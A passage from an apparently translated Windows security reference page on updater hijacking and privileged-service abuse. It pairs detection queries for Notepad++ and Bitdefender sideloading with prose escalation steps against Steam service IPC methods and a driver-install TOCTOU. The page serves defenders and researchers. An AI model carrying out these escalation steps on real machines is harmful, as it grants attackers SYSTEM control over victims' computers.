- **BYO signed binary sideloading** को download के बाद detection pivot मानें: जब signed vendor EXE अपने canonical install path के बाहर से किसी DLL नाम को load करे (जैसे, Bitdefender का Temp/Downloads से `log.dll` load करना), या जब updater temp में non-vendor signatures वाले installers drop/execute करे, तो alert करें।
- इस chain में देखे गए **malware-specific artifacts** पर नज़र रखें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में `gup.exe` द्वारा की गई असामान्य writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और बाद के versions में WinGUp को मजबूत किया: अब लौटाए गए XML पर signature होता है (XMLDSig), और नए builds केवल transport पर भरोसा करने के बजाय downloaded installer का certificate + signature verification लागू करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE द्वारा sideloading <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> एक गैर-Notepad++ installer लॉन्च कर रहा है</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

ये पैटर्न ऐसे किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading से “trusted” updates के रूप में remote code execution मिल सकता है।

### दूसरा update trigger: notification configuration

एक updater अलग-अलग remote configurations का इस्तेमाल **content को stage करने और उसका execution trigger करने** के लिए कर सकता है। इसके लिए configurations या उनके responses पर नियंत्रण आवश्यक है; रिपोर्ट में यह नहीं बताया गया कि origin तक पहुँच कैसे मिली। AOMEI मामले में, `down_html.ini` ने archive URL, version (`thrid`) और MD5 (`Val`) चुना; attacker ने version बढ़ाया और URL तथा उससे मेल खाने वाला checksum, दोनों बदल दिए। यह ऊपर बताए गए [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) का उदाहरण है। अतिरिक्त execution path `Notifycfg.ini` था: इसने `ABNotify.exe` को WebView में स्थानीय `file:///` URL के ज़रिए निकाली गई `upgrade-now.html` लोड करने का निर्देश दिया। पेज ने अपने-आप एक पास की executable पर नेविगेट किया, जिसे WebView ने system shell को सौंप दिया। child ने notifier के privileges हासिल किए; इससे अपने-आप उसे SYSTEM privileges नहीं मिले।<sup>[[17]](#references)[[18]](#references)</sup>

Google ने छेड़छाड़ की गई `Notifycfg.ini` की भी रिपोर्ट दी, जिसमें 35,000 से अधिक दोहराए गए dummy sections थे, जिन्होंने इस client के सामान्य version gate को पार कर लिया। रिपोर्ट किसी सामान्य parser bypass को स्थापित नहीं करती। Attacker ने remote files को पाँच से दस मिनट की अवधि के बाद बहाल कर दिया, इसलिए बदली हुई configuration केवल उन्हीं clients को मिली जिन्होंने उस अवधि के दौरान poll किया। इस notification channel में एक अलग [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) भी था, जिसके लिए archive को execute करने की आवश्यकता नहीं थी।<sup>[[18]](#references)</sup>

---
## privileged service IPC में shared-memory bootstrap

सिर्फ named-pipe enumeration तक सीमित न रहें। SYSTEM broker connection setup के लिए permissive named **file mapping** expose कर सकता है, फिर requesting process में anonymous pipe handles duplicate कर सकता है। Steam के परीक्षण किए गए design में, `Global\SteamClientService_SharedMemFile` और `Global\SteamClientService_SharedMemLock` client PID/event handshake को coordinate करते हैं; service दो pipe handles लौटाती है और इसके बाद length-prefixed requests में `RunInterface` (`0x01`) का उपयोग होता है। Mapping DACL किसी भी integrity level के clients को अनुमति देता था। `steamclient64.dll` में मौजूद internal `CSteamServiceWin32` object एक व्यावहारिक client देता था: build-specific global को resolve करें, vtable slot 0 `Connect` को call करें, फिर handshake को दोबारा implement करने के बजाय interface maps का उपयोग करें। IPC तक पहुँचना केवल एक prerequisite है; escalation होगी या नहीं, यह privileged handler के trust decision पर निर्भर करता है। <sup>[[19]](#references)[[20]](#references)</sup>

### Signed manifest से stale executable allowlist बनती है

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) signed VDF के `kvsignatures` को verify करता है, लेकिन immutable file identity के बजाय **expanded executable pathname** दर्ज करता है। `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` जैसी signed `Run Process` entry के साथ ऐसा `%INSTALLDIR% दें जो user-writable हो। उसी exact expanded path पर replacement executable रखें, फिर unsigned VDF के साथ `RunInstallScript` (slot 22) call करें, जिसमें `Process 1` का नाम allowlisted path हो। यह entry signed script के execution के बाद भी service restart तक बनी रहती है; रिपोर्ट किए गए implementation में SYSTEM launch से पहले file को दोबारा verify नहीं किया जाता। लगाए गए filename को वास्तविक signed entry से मिलाएँ, केवल prerequisite category से नहीं। <sup>[[19]](#references)[[20]](#references)</sup>

### Module-manager child process, direct-load signature check को bypass करता है

`IClientModuleManager::LoadModule` (slot 0) module bytes स्वीकार करता है, यदि दिया गया ID उनके CRC32 से मेल खाता हो। `flags & 8` के साथ `CallFunctionAsync` (slot 3) **child-process** branch चुनता है, न कि direct reflective-load branch, जो Valve signature verify करती है। Service installation directory से `legacycompat\servicecall_<CRC>.dll` लिखती है और `legacycompat\steamservice.exe /runfunc ...` launch करती है। यदि वह directory user-writable हो, तो बाद वाले path पर executable रखें, CRC से मेल खाने वाला कोई भी बेकार module load करें और bit 3 set करके async method call करें। रिपोर्ट किए गए build में child executable और disk पर लिखी DLL authenticate नहीं किए गए थे। Module का स्वयं काम करने वाला payload होना आवश्यक नहीं: बदली गई child executable ही SYSTEM के रूप में चलती है। <sup>[[19]](#references)[[20]](#references)</sup>

### privileged driver installation से पहले catalog-member checks

Driver-install broker के लिए जाँचें कि उसका catalog validation **installer को दी गई exact INF** से जुड़ा है या नहीं। रिपोर्ट किए गए `InstallVrLinkDongleDriver` path में, `WinVerifyTrust` एक catalog validate करता है और `CryptCATAdminCalcHashFromFileHandle` caller-supplied directory में *कम-से-कम एक* matching file खोजता है, लेकिन फिर service यह स्थापित किए बिना `pnputil /add-driver ... /install` चलाती है कि `netrtwlanuval.inf` ही इच्छित catalog member है। Flat या architecture-specific directory स्वीकार की जाती है। इसलिए, किसी भी matching directory member वाला signed catalog service की कमजोर जाँच पार कर सकता है, भले ही privileged installer को दी गई INF अलग हो। यह न मानें कि इससे अकेले Windows driver-signing policy विफल हो जाती है: सफल installation अब भी replacement package और host policy पर निर्भर करती है। <sup>[[19]](#references)[[20]](#references)</sup>

`pnputil` द्वारा INF खोलने से पहले service अपने validation handles release कर देती है, जिससे [TOCTOU gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) बनता है—यहाँ sink executable update के बजाय driver installation है। Oplock का इस्तेमाल check और installer द्वारा file खोलने के बीच substitution का सही समय तय करने के लिए किया जा सकता है। यही IPC अलग-अलग consent prerequisites के तहत [secure-desktop input forwarding](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) भी expose करता है। <sup>[[19]](#references)</sup>

## References
- [1] [सलाह – Windows के लिए Netskope Client – Rogue Server के ज़रिए Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope सुरक्षा सलाह NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 को pwn करना](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के ज़रिए Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors द्वारा Notepad++ Supply Chain का शोषण](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident पर अपडेट](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows के लिए Netskope Client में CVE-2025-0309 के fix को bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation Bugs का पता लगाना](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC से SYSTEM तक](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper supply-chain compromise](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group और Mandiant – अस्थायी Supply Chain Tampering की जाँच](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Valve को पलटना](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoCs](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
